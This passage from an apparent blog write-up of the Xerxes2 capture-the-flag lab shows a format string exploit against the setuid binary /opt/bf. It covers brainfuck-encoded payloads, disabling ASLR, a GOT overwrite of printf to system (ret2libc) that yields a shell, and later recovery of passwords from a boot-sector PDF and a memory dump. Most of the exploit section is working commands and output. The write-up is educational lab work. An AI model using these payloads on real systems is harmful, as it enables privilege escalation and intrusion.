&lt;p&gt;First of all, the program will only &lt;code&gt;printf(buf)&lt;/code&gt; the buffer which is brainfk. This is triggered with a &lt;code&gt;#&lt;/code&gt;. For us to be able to do anything even remotely related to brainfk, we need to ensure that our payloads are encoded into brainfk before it gets fed to &lt;code&gt;/opt/bf&lt;/code&gt;. Remembering the research that was done, I opted to print as many &lt;code&gt;+&lt;/code&gt;&amp;rsquo;s as the ASCII value of the character I wanted, and them simply increment the data cell with &lt;code&gt;&amp;gt;&lt;/code&gt;, preparing for the next character.&lt;/p&gt;

&lt;p&gt;To test my theory, I prepared my first payload using &lt;code&gt;python -c&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;delacroix@xerxes2:~$ echo $(python -c &#39;print &amp;quot;+&amp;quot; * ord(&amp;quot;a&amp;quot;)&#39;)
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
delacroix@xerxes2:~$ /opt/bf &amp;quot;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#&amp;quot;
a
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That printed the character &lt;code&gt;a&lt;/code&gt; as expected. Great! However, we need to be able to print far more character, and multiples too, so lets see if we increment the pointer by 1 will it &lt;code&gt;printf(buf)&lt;/code&gt; that too?&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;delacroix@xerxes2:~$ /opt/bf &amp;quot;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&amp;gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#&amp;quot;
aa
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2 &lt;code&gt;a&lt;/code&gt;&amp;rsquo;s! Awesome. So the theory works. However, the last thing I was going to do was copy paste all that crap, so instead, lets write some python and use &lt;a href=&#34;https://docs.python.org/2/tutorial/datastructures.html#list-comprehensions&#34;&gt;list comprehension&lt;/a&gt; to prepare our payloads for &lt;code&gt;/opt/bf&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;print &amp;quot;&amp;gt;&amp;quot;.join([&amp;quot;+&amp;quot; * ord(x) for x in (&amp;quot;the quick brown fox&amp;quot;)])
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You can copy and paste the above command into a python shell and see the amount of &lt;code&gt;+&lt;/code&gt; there are haha.&lt;/p&gt;

&lt;p&gt;Anyways, that settled the brainfk problem.&lt;/p&gt;

&lt;h3 id=&#34;opt-bf-part2&#34;&gt;/opt/bf - part2&lt;/h3&gt;

&lt;p&gt;Now that we can easily provide input to &lt;code&gt;/opt/bf&lt;/code&gt; to print using the vulnerable &lt;code&gt;printf()&lt;/code&gt; function, it was time to test the actual format string vulnerability. Just like the above mentioned resources (and many many others on the internet) have shown, we provide some &lt;code&gt;AAAA&lt;/code&gt; and search for them:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;delacroix@xerxes2:~$ /opt/bf &amp;quot;$(python -c &#39;print &amp;quot;&amp;gt;&amp;quot;.join([&amp;quot;+&amp;quot; * ord(x) for x in (&amp;quot;AAAA&amp;quot; + &amp;quot;.%x&amp;quot; * 20 + &amp;quot;\n&amp;quot;)])&#39;)#&amp;quot;
AAAA.b777bff4.0.0.bf842d58.b779b9c0.40.112a.bf83b820.b777bff4.bf842d58.80486eb.bf843860.bf83b820.7530.0.41414141.2e78252e.252e7825.78252e78.2e78252e
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here we are using the previously built brainfk payload generator, and giving it format strings, searching for the &lt;code&gt;AAAA&lt;/code&gt; input we have given it. Instead of typing like 20 &lt;code&gt;%s&lt;/code&gt;, I just use python to do the hard work for me. As you can see, the string &lt;code&gt;41414141&lt;/code&gt; is present in the output. We can test if we are able to use direct parameter access to access just the string we want:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;delacroix@xerxes2:~$ /opt/bf &amp;quot;$(python -c &#39;print &amp;quot;&amp;gt;&amp;quot;.join([&amp;quot;+&amp;quot; * ord(x) for x in (&amp;quot;AAAA&amp;quot; + &amp;quot;.%16$x&amp;quot; &amp;quot;\n&amp;quot;)])&#39;)#&amp;quot;
AAAA.41414141
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yup! Parameter 16 gives us what we need :)&lt;/p&gt;

&lt;p&gt;Great. Were making progress&amp;hellip; I think.&lt;/p&gt;

&lt;p&gt;For the sake of time, I am not going to document the 412643932471236 attempts that were made at getting this to work. Instead, here is the path that did eventually work. This is the part of Xerxes2 that undoubtedly took me the longest to get right.&lt;/p&gt;

&lt;h3 id=&#34;opt-bf-part3&#34;&gt;/opt/bf - part3&lt;/h3&gt;

&lt;p&gt;Now that we know where we can start manipulating pointers, we need to find out &lt;em&gt;what&lt;/em&gt; we should manipulate. There are many options here, however your decision on which path to take is influenced by many vectors.&lt;/p&gt;

&lt;p&gt;First of all, &lt;code&gt;/opt/bf&lt;/code&gt; was compiled with the NX bit:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;delacroix@xerxes2:~$ readelf -l /opt/bf | grep STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Secondly, ASLR is enabled, and can be seen when printing the shared library dependencies. The memory positions are different for every check:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;delacroix@xerxes2:~$ ldd /opt/bf
    linux-gate.so.1 =&amp;gt;  (0xb7734000)
    libc.so.6 =&amp;gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xb75c9000)
    /lib/ld-linux.so.2 (0xb7735000)
delacroix@xerxes2:~$ ldd /opt/bf
    linux-gate.so.1 =&amp;gt;  (0xb779b000)
    libc.so.6 =&amp;gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xb7630000)
    /lib/ld-linux.so.2 (0xb779c000)
delacroix@xerxes2:~$ ldd /opt/bf
    linux-gate.so.1 =&amp;gt;  (0xb77c0000)
    libc.so.6 =&amp;gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xb7655000)
    /lib/ld-linux.so.2 (0xb77c1000)
delacroix@xerxes2:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thankfully, since this is a x86 (32bit) OS, its quite trivial to disable this (sort of) with &lt;code&gt;ulimit -s unlimited&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;delacroix@xerxes2:~$ ulimit -s unlimited

delacroix@xerxes2:~$ ldd /opt/bf
    linux-gate.so.1 =&amp;gt;  (0x4001e000)
    libc.so.6 =&amp;gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0x40026000)
    /lib/ld-linux.so.2 (0x40000000)
delacroix@xerxes2:~$ ldd /opt/bf
    linux-gate.so.1 =&amp;gt;  (0x4001e000)
    libc.so.6 =&amp;gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0x40026000)
    /lib/ld-linux.so.2 (0x40000000)
delacroix@xerxes2:~$ ldd /opt/bf
    linux-gate.so.1 =&amp;gt;  (0x4001e000)
    libc.so.6 =&amp;gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0x40026000)
    /lib/ld-linux.so.2 (0x40000000)
delacroix@xerxes2:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The memory locations are now static :) With that done, lets have a look at what pointer we would like to override, and then where we should be overwriting it to. We first take a look at the Global Offset Table:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;delacroix@xerxes2:~$ objdump -R /opt/bf

/opt/bf:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049a38 R_386_GLOB_DAT    __gmon_start__
08049a48 R_386_JUMP_SLOT   printf
08049a4c R_386_JUMP_SLOT   getchar
08049a50 R_386_JUMP_SLOT   __gmon_start__
08049a54 R_386_JUMP_SLOT   exit
08049a58 R_386_JUMP_SLOT   __libc_start_main
08049a5c R_386_JUMP_SLOT   memset
08049a60 R_386_JUMP_SLOT   putchar


delacroix@xerxes2:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here, we will choose to override the &lt;code&gt;printf&lt;/code&gt; functions pointer. This is at 0x08049a48. So, this address will have the location of our &lt;em&gt;evil code&lt;/em&gt;. But now, how do we know where the evil code is and &lt;em&gt;what&lt;/em&gt; is it? Again, this was another interesting thing that had me researching for a very long time. In the end, it came to light that there is such a thing as &lt;a href=&#34;http://protostar-solutions.googlecode.com/hg/Stack%206/ret2libc.pdf&#34;&gt;ret2libc&lt;/a&gt;. The basic idea here is that we override the pointer for &lt;code&gt;printf&lt;/code&gt; to &lt;code&gt;system&lt;/code&gt; with a argument. I highly recommend you read &lt;a href=&#34;http://protostar-solutions.googlecode.com/hg/Stack%206/ret2libc.pdf&#34;&gt;this pdf&lt;/a&gt; for a proper explanation on what exactly this means.&lt;/p&gt;

&lt;p&gt;The only thing that is left to determine is where &lt;code&gt;system&lt;/code&gt; is in memory. Luckily this is also pretty easy to find out. Fire up &lt;code&gt;gdb&lt;/code&gt;, run the binary and &lt;code&gt;print system&lt;/code&gt; to get the address:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;delacroix@xerxes2:~$ gdb -q /opt/bf
Reading symbols from /opt/bf...(no debugging symbols found)...done.
(gdb) run
Starting program: /opt/bf
usage: /opt/bf [program]
[Inferior 1 (process 11342) exited with code 0377]
(gdb) print system
$1 = {&amp;lt;text variable, no debug info&amp;gt;} 0x40062000 &amp;lt;system&amp;gt;
(gdb)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Soooo, 0x40062000. We have the point in memory where &lt;code&gt;system()&lt;/code&gt; lives, and we know where the program is going to go to lookup the &lt;code&gt;printf&lt;/code&gt; function. All that is left now is to exploit the format string vulnerability, override the location of &lt;code&gt;printf&lt;/code&gt; with &lt;code&gt;system&lt;/code&gt;, and provide a new argument for the now fooled &lt;code&gt;printf&lt;/code&gt; to run. A new argument can be given by simply providing another &lt;code&gt;#&lt;/code&gt; (remember we have the source so that was easy to figure out).&lt;/p&gt;

&lt;h3 id=&#34;opt-bf-part4&#34;&gt;/opt/bf - part4&lt;/h3&gt;

&lt;p&gt;We have all the information we need, lets get to work.&lt;/p&gt;

&lt;p&gt;We fire up &lt;code&gt;gdb&lt;/code&gt;, and instead of printing the location of &lt;code&gt;AAAA&lt;/code&gt;, we provide a memory address, with a &lt;code&gt;%n&lt;/code&gt; format string so that we can write the amount of bites needed to override the pointer location.&lt;/p&gt;

&lt;p&gt;To aid in getting the exact amount of padding right, we will set a breakpoint just before the application finished so that we can examine the pointer 0x08049a48 from the GOT:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;delacroix@xerxes2:~$ gdb -q /opt/bf
Reading symbols from /opt/bf...(no debugging symbols found)...done.

(gdb) disass main
Dump of assembler code for function main:
   0x08048684 &amp;lt;+0&amp;gt;: push   %ebp
   0x08048685 &amp;lt;+1&amp;gt;: mov    %esp,%ebp
   0x08048687 &amp;lt;+3&amp;gt;: and    $0xfffffff0,%esp
   0x0804868a &amp;lt;+6&amp;gt;: sub    $0x7540,%esp
   0x08048690 &amp;lt;+12&amp;gt;:    cmpl   $0x1,0x8(%ebp)
   0x08048694 &amp;lt;+16&amp;gt;:    jg     0x80486b7 &amp;lt;main+51&amp;gt;
   0x08048696 &amp;lt;+18&amp;gt;:    mov    0xc(%ebp),%eax
   0x08048699 &amp;lt;+21&amp;gt;:    mov    (%eax),%eax
   0x0804869b &amp;lt;+23&amp;gt;:    mov    %eax,0x4(%esp)
   0x0804869f &amp;lt;+27&amp;gt;:    movl   $0x804887c,(%esp)
   0x080486a6 &amp;lt;+34&amp;gt;:    call   0x8048390 &amp;lt;printf@plt&amp;gt;
   0x080486ab &amp;lt;+39&amp;gt;:    movl   $0xffffffff,(%esp)
   0x080486b2 &amp;lt;+46&amp;gt;:    call   0x80483c0 &amp;lt;exit@plt&amp;gt;
   0x080486b7 &amp;lt;+51&amp;gt;:    movl   $0x7530,0x8(%esp)
   0x080486bf &amp;lt;+59&amp;gt;:    movl   $0x0,0x4(%esp)
   0x080486c7 &amp;lt;+67&amp;gt;:    lea    0x10(%esp),%eax
   0x080486cb &amp;lt;+71&amp;gt;:    mov    %eax,(%esp)
   0x080486ce &amp;lt;+74&amp;gt;:    call   0x80483e0 &amp;lt;memset@plt&amp;gt;
   0x080486d3 &amp;lt;+79&amp;gt;:    mov    0xc(%ebp),%eax
   0x080486d6 &amp;lt;+82&amp;gt;:    add    $0x4,%eax
   0x080486d9 &amp;lt;+85&amp;gt;:    mov    (%eax),%eax
   0x080486db &amp;lt;+87&amp;gt;:    lea    0x10(%esp),%edx
   0x080486df &amp;lt;+91&amp;gt;:    mov    %edx,0x4(%esp)
   0x080486e3 &amp;lt;+95&amp;gt;:    mov    %eax,(%esp)
   0x080486e6 &amp;lt;+98&amp;gt;:    call   0x80484ec &amp;lt;bf&amp;gt;
   0x080486eb &amp;lt;+103&amp;gt;:   movl   $0x0,(%esp) # &amp;lt;-- we will break here
   0x080486f2 &amp;lt;+110&amp;gt;:   call   0x80483c0 &amp;lt;exit@plt&amp;gt;
End of assembler dump.

(gdb) break *0x080486eb
Breakpoint 1 at 0x80486eb

(gdb) run &amp;quot;$(python -c &#39;print &amp;quot;&amp;gt;&amp;quot;.join([&amp;quot;+&amp;quot; * ord(x) for x in (&amp;quot;\x48\x9a\x04\x08&amp;quot; + &amp;quot;%16$n&amp;quot;)])&#39;)#&amp;quot;
Starting program: /opt/bf &amp;quot;$(python -c &#39;print &amp;quot;&amp;gt;&amp;quot;.join([&amp;quot;+&amp;quot; * ord(x) for x in (&amp;quot;\x48\x9a\x04\x08&amp;quot; + &amp;quot;%16$n&amp;quot;)])&#39;)#&amp;quot;

Breakpoint 1, 0x080486eb in main ()

(gdb) x/x 0x08049a48
0x8049a48 &amp;lt;printf@got.plt&amp;gt;: 0x00000004
(gdb)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Oooooooooooh. So basically 0x8049a48 now says &lt;code&gt;printf&lt;/code&gt; lives at 0x00000004. Not entirely true though, but we will fix this. Fixing this is quite easy too. Using some python again, we can calculate the amount of bytes we must write to get the memory location we want. We know we want to write to &lt;code&gt;system&lt;/code&gt;, that lives in memory at 0x40062000. We will split the calculation up into 2 parts, and first write the 0x2000, and then the 0x4006. We can see that we have written 4 bytes already, so to calculate the first part, we will simply subtract 4 from 0x2000 and pad parameter 16 with the amount.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;(gdb) shell echo $(python -c &#39;print 0x2000-0x4&#39;)
8188 # output is a decimal value
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We now pad the format string as required, re-run the program in &lt;code&gt;gdb&lt;/code&gt;, and inspect 0x08049a48 from the GOT&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;(gdb) run &amp;quot;$(python -c &#39;print &amp;quot;&amp;gt;&amp;quot;.join([&amp;quot;+&amp;quot; * ord(x) for x in (&amp;quot;\x48\x9a\x04\x08&amp;quot; + &amp;quot;%8188u%16$n&amp;quot;)])&#39;)#&amp;quot;
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/bf &amp;quot;$(python -c &#39;print &amp;quot;&amp;gt;&amp;quot;.join([&amp;quot;+&amp;quot; * ord(x) for x in (&amp;quot;\x48\x9a\x04\x08&amp;quot; + &amp;quot;%8188u%16$n&amp;quot;)])&#39;)#&amp;quot;
H�
Breakpoint 1, 0x080486eb in main ()
(gdb) x/x 0x08049a48
0x8049a48 &amp;lt;printf@got.plt&amp;gt;: 0x00002000
(gdb)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You will see some whitespace output as a result of the &lt;code&gt;%8188u&lt;/code&gt;, but inspecting the pointer from GOT reveals that we have the lower part of the memory now set correctly (0x00002000)! :) The upper part of the address is calculated in a similar way, however, we are going to be moving on 2 places in memory to write this value and provide another format string. This means that our lower part of the memory will change as a result, and we will need to compensate for that when we calculate the upper part.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;(gdb) run &amp;quot;$(python -c &#39;print &amp;quot;&amp;gt;&amp;quot;.join([&amp;quot;+&amp;quot; * ord(x) for x in (&amp;quot;\x48\x9a\x04\x08&amp;quot; + &amp;quot;\x4a\x9a\x04\x08&amp;quot; + &amp;quot;%8188u%16$n&amp;quot; + &amp;quot;%17$n&amp;quot;)])&#39;)#&amp;quot;
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/bf &amp;quot;$(python -c &#39;print &amp;quot;&amp;gt;&amp;quot;.join([&amp;quot;+&amp;quot; * ord(x) for x in (&amp;quot;\x48\x9a\x04\x08&amp;quot; + &amp;quot;\x4a\x9a\x04\x08&amp;quot; + &amp;quot;%8188u%16$n&amp;quot; + &amp;quot;%17$n&amp;quot;)])&#39;)#&amp;quot;
H�J�                                                                                                                                                                                                              3
Breakpoint 1, 0x080486eb in main ()
(gdb) x/x 0x08049a48
0x8049a48 &amp;lt;printf@got.plt&amp;gt;: 0x20042004
(gdb)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As you can see, we have moved up 4 bytes on the lower part of the address, so we can simply take 4 off 8188 to fix that. To determine the upper part of the address though, we will do another hex calculation and remove the amount that we have from the amount that we want:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;(gdb) shell echo $(python -c &#39;print 0x4006-0x2000&#39;)
8198 # output is a decimal value

(gdb) run &amp;quot;$(python -c &#39;print &amp;quot;&amp;gt;&amp;quot;.join([&amp;quot;+&amp;quot; * ord(x) for x in (&amp;quot;\x48\x9a\x04\x08&amp;quot; + &amp;quot;\x4a\x9a\x04\x08&amp;quot; + &amp;quot;%8184u%16$n&amp;quot; + &amp;quot;%8198u%17$n&amp;quot;)])&#39;)#&amp;quot;
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/bf &amp;quot;$(python -c &#39;print &amp;quot;&amp;gt;&amp;quot;.join([&amp;quot;+&amp;quot; * ord(x) for x in (&amp;quot;\x48\x9a\x04\x08&amp;quot; + &amp;quot;\x4a\x9a\x04\x08&amp;quot; + &amp;quot;%8184u%16$n&amp;quot; + &amp;quot;%8198u%17$n&amp;quot;)])&#39;)#&amp;quot;
H�J�
Breakpoint 1, 0x080486eb in main ()
(gdb) x/x 0x08049a48
0x8049a48 &amp;lt;printf@got.plt&amp;gt;: 0x40062000
(gdb)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;w00t. We have rewritten the GOT for &lt;code&gt;printf&lt;/code&gt; to the location of the libc &lt;code&gt;system&lt;/code&gt; call using the format string vulnerability. Phew.&lt;/p&gt;

&lt;h3 id=&#34;opt-bf-part5&#34;&gt;/opt/bf - part5&lt;/h3&gt;

&lt;p&gt;Now, all that is left is to get the &lt;code&gt;printf&lt;/code&gt; to rerun (using the &lt;code&gt;#&lt;/code&gt;) with a payload such as &lt;code&gt;/bin/sh&lt;/code&gt;. We will append the &lt;code&gt;/bin/sh&lt;/code&gt; to the end and just add another &lt;code&gt;#&lt;/code&gt; to call &lt;code&gt;printf&lt;/code&gt; (which is now overridden):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;delacroix@xerxes2:~$ /opt/bf &amp;quot;$(python -c &#39;print &amp;quot;&amp;gt;&amp;quot;.join([&amp;quot;+&amp;quot; * ord(x) for x in (&amp;quot;\x48\x9a\x04\x08&amp;quot; + &amp;quot;\x4a\x9a\x04\x08&amp;quot; + &amp;quot;%8184u%16$n&amp;quot; + &amp;quot;%8198u%17$n&amp;quot; + &amp;quot;;/bin/sh&amp;quot;)])&#39;)##&amp;quot;
H�J�                                                                                                                                                                                                              d
$ id
uid=1002(delacroix) gid=1002(delacroix) euid=1001(polito) egid=1001(polito) groups=1001(polito),1002(delacroix)
$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Oly. Crap. That. Was. Awesome. :D :D&lt;/p&gt;

&lt;p&gt;We have just exploited a format string vulnerability on a binary that has the NX bit set, encoded with brainfk using ret2libc.&lt;/p&gt;

&lt;h2 id=&#34;becoming-korenchkin&#34;&gt;becoming korenchkin&lt;/h2&gt;

&lt;p&gt;We just got a shell with a euid for &lt;code&gt;polito&lt;/code&gt;. To make life easier, I copied the public key I generated earlier for the first shell into &lt;code&gt;polito&lt;/code&gt;&amp;rsquo;s home, and SSH&amp;rsquo;d in as that user.&lt;/p&gt;

&lt;p&gt;At first glance, it appeared as if we have a gpg encrypted &lt;code&gt;dump&lt;/code&gt; and a pdf. There was also a cronjob to start a netcat server piping a text file out via tcp/4444 (remember the mp3 form earlier? :D)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;polito@xerxes2:~$ ls -lh
total 43M
-rw-r--r-- 1 polito polito 140K Jul 16 10:57 audio.txt
-rw-r--r-- 1 polito polito  43M Jul 16 12:17 dump.gpg
-rw-r--r-- 1 polito polito  27K Jul 16 12:19 polito.pdf
polito@xerxes2:~$ crontab -l
[...]
@reboot while true ; do nc -l -p 4444 &amp;lt; /home/polito/audio.txt ; done
polito@xerxes2:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There was not much I could do with the &lt;code&gt;dump.gpg&lt;/code&gt; yet, so I decided to open up the pdf in a pdf viewer:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/xerxesII_polito_pdf.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;That is all the PDF had. The QR code resolves to &amp;ldquo;XERXES is watching&amp;hellip;&amp;rdquo;. I tried to highlight all of the text in the PDF to maybe reveal a piece of text that was white in color, but nothing apparent came out. The next step was to run the PDF through the &lt;code&gt;file&lt;/code&gt; utility.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;polito@xerxes2:~$ file -k polito.pdf
polito.pdf: x86 boot sector, code offset 0xe0 DBase 3 data file with memo(s) (1146103071 records)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&amp;hellip;&lt;em&gt;x86 boot sector&lt;/em&gt;&amp;hellip; wait&amp;hellip; &lt;strong&gt;WHAT&lt;/strong&gt;?. Ok, so that is interesting. Opening the PDF in a HEX editor revealed 2 PDF headers:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;00000000  83 E0 FF EB  1F 25 50 44   46 2D 31 2E  35 0A 39 39 .....%PDF-1.5.99
00000010  39 20 30 20  6F 62 6A 0A   3C 3C 3E 3E  0A 73 74 72 9 0 obj.&amp;lt;&amp;lt;&amp;gt;&amp;gt;.str
00000020  65 61 6D 0A  68 E0 08 17   BC 00 10 68  C0 07 1F EB eam.h......h....
00000030  21 59 81 F9  4D 5A 74 0C   B4 0E 86 C1  CD 10 86 C5 !Y..MZt.........
00000040  CD 10 EB ED  BE 55 00 AC   75 02 EB FE  B4 0E CD 10 .....U..u.......
00000050  EB F5 EB 72  E9 2D 2D 57   41 52 4E 49  4E 47 2D 2D ...r.--WARNING--
00000060  0A 20 20 20  55 6E 61 75   74 68 6F 72  69 7A 65 64 .   Unauthorized
00000070  20 66 69 6C  65 20 61 63   63 65 73 73  20 77 69 6C file access wil
00000080  6C 20 62 65  20 72 65 70   6F 72 74 65  64 2E 0A 20 l be reported..
00000090  20 20 20 20  58 45 52 58   45 53 20 77  69 73 68 65 XERXES wishe
000000A0  73 20 79 6F  75 0A 20 20   20 20 20 20  20 20 20 20 s you.
000000B0  61 20 6D 6F  73 74 20 70   72 6F 64 75  63 74 69 76 a most productiv
000000C0  65 20 64 61  79 00 68 6F   77 68 59 58  68 0D 0A 68 e day.howhYXh..h
000000D0  37 69 68 68  7A 68 4F 77   68 34 35 68  0A 40 68 67 7ihhzhOwh45h.@hg
000000E0  49 68 20 2C  68 23 6F 68   4D 5A 68 0A  0A 68 4E 6C Ih ,h#ohMZh..hNl
000000F0  68 61 57 68  46 75 68 61   6D 68 0A 20  68 3A 20 68 haWhFuhamh. h: h
00000100  69 73 68 64  20 68 6F 72   68 73 77 68  61 73 68 20 ishd horhswhash
00000110  70 68 68 65  68 0A 54 E9   17 FF 00 00  00 00 00 00 phheh.T.........
00000120  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
00000130  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
00000140  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
00000150  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
00000160  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
00000170  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
00000180  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
00000190  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
000001A0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
000001B0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
000001C0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
000001D0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
000001E0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
000001F0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 55 AA ..............U.
00000200  25 50 44 46  2D 31 2E 35   0A 25 D0 D4  C5 D8 0A 34 %PDF-1.5.%.....4
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Notice the 2 &lt;code&gt;%PDF-1.5&lt;/code&gt;. Assuming this really was a MBR, I decided to strip the first 512 bytes and put that in a new file. Then, the remainder of the bytes to a second file, and test by attempting to open both in a PDF viewer again.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# head -c 512 polito.pdf &amp;gt; first
root@kali:~# file -k first
first: x86 boot sector, code offset 0xe0 DBase 3 data file with memo(s) (1146103071 records)

root@kali:~# tail -c +512 polito.pdf &amp;gt; second
root@kali:~# file second
second: Dyalog APL
root@kali:~#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Opening &lt;code&gt;first&lt;/code&gt; in a PDF viewer gave a blank PDF, and &lt;code&gt;second&lt;/code&gt; gave the PDF we saw originally with &lt;code&gt;polito.pdf&lt;/code&gt;. &lt;code&gt;first&lt;/code&gt; was still seen as as x86 boot sector file. I searched furiously for way to analyze bootsector code, learned about the &lt;a href=&#34;http://en.wikipedia.org/wiki/Master_boot_record#Sector_layout&#34;&gt;structure&lt;/a&gt; etc. Eventually it was time to take a break and come back with a fresh look at this.&lt;/p&gt;

&lt;p&gt;I came back with some new ideas. One of them being that I should quickly create a VM, attach &lt;code&gt;first&lt;/code&gt; as a disk and try run it and see what the output would be. VirtualBox did not like the file format of &lt;code&gt;first&lt;/code&gt; :( Next I resorted to using &lt;code&gt;qemu&lt;/code&gt;. And success!&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/xerxesII_qemu_boot.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Running &lt;code&gt;$ qemu first&lt;/code&gt;, booted a vm and ran the bootsector code, revealing a password of &lt;em&gt;amFuaWNl&lt;/em&gt;. The next part was pretty easy. I assumed this was the password word for the potentially GPG encrypted &lt;code&gt;dump&lt;/code&gt; file:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;polito@xerxes2:~$ gpg -d dump.gpg &amp;gt; decrypted_dump
gpg: CAST5 encrypted data
gpg: encrypted with 1 passphrase
gpg: WARNING: message was not integrity protected

polito@xerxes2:~$ file decrypted_dump
decrypted_dump: data

polito@xerxes2:~$ ls -lh decrypted_dump
-rw-r--r-- 1 polito polito 126M Aug 10 02:12 decrypted_dump
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So we successfully decrypted &lt;code&gt;dump.gpg&lt;/code&gt; it seems resulting in a 126M file, however at first glance it appears to just be junk. I paged and paged and paged and paged and paged through &lt;code&gt;less&lt;/code&gt; until I saw cleartext that looked like kernel boot messages. The first thought that came to mind after seeing this was &amp;ldquo;Could this be some sort of memory dump?&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;As the kernel messages were interesting, I decided to put the decrypted dump through strings. Eventually after going through even more pages, it seemed like there were even some command history in the dump. Ok, well then I believe its time to look for things that could relate to that file in &lt;code&gt;/opt/backup&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;polito@xerxes2:~$ grep $(ls /opt/backup/) decrypted_strings
korenchkin.tar.enc
openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
polito@xerxes2:~$
&lt;/code&gt;&lt;/pre&gt;

